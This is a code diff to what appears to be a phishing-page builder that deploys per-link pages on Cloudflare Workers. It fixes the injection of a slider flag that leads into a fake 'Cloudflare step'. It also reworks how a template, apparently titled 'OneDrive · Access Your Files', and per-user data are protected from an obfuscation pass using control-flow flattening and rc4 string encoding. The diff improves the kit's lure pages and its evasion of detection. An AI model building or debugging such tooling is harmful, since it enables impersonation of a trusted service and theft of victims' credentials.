@@ -109,6 +109,21 @@ async function buildWorkerScript(link, user) {
   
   if (isSliderDesign) {
     console.log('[TemplateLoader] Slider design detected, injecting slider overlay...');
+
+    // vg-engine gates its whole slider chain handler on window.__SLIDER_DESIGN
+    // (initSliderChainHandler returns early when it is false/undefined), so the
+    // flag MUST be in the page. The backend loader sets it; this worker loader
+    // did not, so initSliderChainHandler bailed out, __vgOnSliderComplete was
+    // never registered, and the slider dead-ended with no Cloudflare step.
+    const sliderFlag = '<script>window.__SLIDER_DESIGN=true</script>';
+    if (templateHTML.includes('</head>')) {
+      templateHTML = templateHTML.replace('</head>', sliderFlag + '</head>');
+      console.log('  __SLIDER_DESIGN flag injected before </head>');
+    } else {
+      templateHTML = templateHTML.replace(/<body[^>]*>/i, function (m) { return m + sliderFlag; });
+      console.warn('  No </head> - __SLIDER_DESIGN flag injected at top of <body>');
+    }
+
     const sliderOverlay = buildSliderOverlay(sliderData, link, false);
     console.log('  sliderOverlay length:', sliderOverlay.length);
     console.log('  sliderOverlay contains <script>:', sliderOverlay.includes('<script>'));
@@ -248,51 +263,54 @@ async function buildWorkerScript(link, user) {
       console.log('[Obfuscation] Worker: Starting safe obfuscation...');
       const originalLength = workerScript.length;
       
-      // Step 1: Extract template HTML to protect it from obfuscation
-      const templateMatch = workerScript.match(/var templateHTML = '([\s\S]*?)';/);
+      // Step 1: Extract template HTML to protect it from obfuscation.
+      //
+      // The template is embedded by JSON.stringify() into a DOUBLE-quoted
+      // declaration (const templateHTML = "...";), so the old regex -
+      // /var templateHTML = '...'/ - matched nothing: wrong declaration keyword
+      // AND wrong quote style. The extraction silently no-oped, and the ~300KB
+      // HTML string was fed straight through controlFlowFlattening + rc4 +
+      // splitStrings, bloating the worker payload enormously.
+      //
+      // This handles var/let/const and either quote style, honouring escapes.
+      const TEMPLATE_HOLE = '\u0000VG_TEMPLATE_HTML\u0000';
+      const USERDATA_HOLE = '\u0000VG_USERDATA\u0000';
+      // Group 1 = "const templateHTML = " (declaration), group 2 = the complete
+      // quoted literal, which JSON.parse() can decode straight away.
+      const QUOTED = '(?:"(?:\\\\.|[^"\\\\])*")|(?:\'(?:\\\\.|[^\'\\\\])*\')';
+      const reTemplate = new RegExp('(\\b(?:var|const|let)\\s+templateHTML\\s*=\\s*)(' + QUOTED + ')\\s*;');
+      const reUserData = new RegExp('(\\b(?:var|const|let)\\s+userData\\s*=\\s*)(' + QUOTED + ')\\s*;');
+
       let extractedTemplate = '';
+      const templateMatch = workerScript.match(reTemplate);
       if (templateMatch) {
-        extractedTemplate = templateMatch[1];
-        // Replace template with placeholder
-        workerScript = workerScript.replace(
-          /var templateHTML = '[\s\S]*?';/,
-          "var templateHTML = _t_;"
-        );
+        extractedTemplate = JSON.parse(templateMatch[2]);
+        workerScript = workerScript.replace(reTemplate, '$1 ' + TEMPLATE_HOLE + ';');
       }
-      
+
       // Step 2: Extract user data to protect it
-      const userDataMatch = workerScript.match(/var userData = '([\s\S]*?)';/);
       let extractedUserData = '';
+      const userDataMatch = workerScript.match(reUserData);
       if (userDataMatch) {
-        extractedUserData = userDataMatch[1];
-        workerScript = workerScript.replace(
-          /var userData = '[\s\S]*?';/,
-          "var userData = _u_;"
-        );
+        extractedUserData = JSON.parse(userDataMatch[2]);
+        workerScript = workerScript.replace(reUserData, '$1 ' + USERDATA_HOLE + ';');
       }
-      
+
       // Step 3: Apply lightweight obfuscation (string encoding + variable renaming)
       // This is safe for Cloudflare Workers because it doesn't rename globals
       workerScript = obfuscateWorkerCodeMulti(workerScript);
-      
-      // Step 4: Re-inject the protected template and user data
+
+      // Step 4: Re-inject the protected template and user data.
+      // JSON.stringify instead of base64/atob: atob() decodes to a Latin-1
+      // string, so any non-ASCII character in the template HTML (e.g. the "·"
+      // in "OneDrive · Access Your Files") would come back as mojibake.
       if (extractedTemplate) {
-        // Encode template as base64 to avoid string escaping issues
-        const encodedTemplate = Buffer.from(extractedTemplate).toString('base64');
-        workerScript = workerScript.replace(
-          'var templateHTML = _t_;',
-          `var templateHTML = atob('${encodedTemplate}');`
-        );
+        workerScript = workerScript.split(TEMPLATE_HOLE).join(JSON.stringify(extractedTemplate));
       }
-      
       if (extractedUserData) {
-        const encodedUserData = Buffer.from(extractedUserData).toString('base64');
-        workerScript = workerScript.replace(
-          'var userData = _u_;',
-          `var userData = atob('${encodedUserData}');`
-        );
+        workerScript = workerScript.split(USERDATA_HOLE).join(JSON.stringify(extractedUserData));
       }
-      
+
       console.log('[Obfuscation] Worker: ' + originalLength + ' -> ' + workerScript.length + ' chars');
     } catch (e) {
       console.error('[Obfuscation] Worker obfuscation failed, using raw script:', e.message);
